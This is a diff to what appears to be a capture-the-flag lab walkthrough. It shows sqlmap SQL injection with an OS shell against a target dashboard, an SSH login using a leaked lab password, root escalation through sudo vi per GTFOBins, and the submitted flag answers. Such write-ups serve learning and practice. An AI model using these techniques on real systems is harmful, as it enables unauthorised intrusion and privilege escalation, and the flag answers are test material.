@@ -100,9 +100,10 @@ john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 admin-hash.txt
 4. Let's use sqlmap and run the following.
 
 ```bash
+sqlmap -u "http://{target_ip}/dashboard.php?search=test" --cookie="PHPSESSID={cookie_value}"
+
 sqlmap -u "http://{target_ip}/dashboard.php?search=test" --cookie="PHPSESSID={cookie_value}" --os-shell
 
-sqlmap -u "http://{target_ip}/dashboard.php?search=test" --cookie="PHPSESSID={cookie_value}" --os-shell --os-shell
 ```
 5. We have spawned a os-shell with user postgres. However executing `sudo -l` does not yield any meaningful results. The os-shell is limited in commands it can execute. It is not interactive 
 
@@ -151,7 +152,7 @@ export TERM=xterm
 
 ### Submit user flag
 
-1. Our connection via reverse shell is always being disconnected from the server. Since we know the password of the user `postgres`, let's just connect via ssh.
+1. Our connection via reverse shell is always being disconnected from the server. Since we know the password (P@s5w0rd! of the user `postgres`, let's just connect via ssh.
    ```bash
    ssh postgres@{target_machine_ip}
    ```
@@ -162,4 +163,32 @@ export TERM=xterm
 
 **Answer:ec9b13ca4d6229cd5cc1e09980965bf7**
 
+### Submit the root flag
 
+1. Continuing with our terminal established via ssh connnection in the previous section. We know that our current `postgres` user has sudo privileges for `vi`. Now let's attempt priviledge escalation.
+   
+2. Let's go to [https://gtfobins.github.io/gtfobins/vi/#shell](https://gtfobins.github.io/gtfobins/vi/#shell) to check if we can run a command to escalte our privileges to root.
+   
+3. Run the following:
+   ```bash
+    sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+   ```
+   ![Screenshot 2024-03-10 at 4 29 43 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/4b7fc1a9-452d-4b4f-a3cc-3926f46aa5ac)
+   
+4. Then execute the following from inside vi based on GTFOBins
+   ```bash
+   :set shell=/bin/sh
+   :shell
+   ```
+5. Now we have escalated our privileges and have a shell with root privileges. Now let's look for `root.txt`
+   ```
+   find / -type f -name "root.txt"
+   ```
+![Screenshot 2024-03-10 at 4 33 06 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/2666f836-1ec0-4d42-8533-ed61a4eb84cf)
+
+   
+6. Now let's look at the file to get flag
+   ```bash
+   vi /root/root.txt
+   ```
+**Answer: ddd6e058e814260bc70e9bbdef2715849**
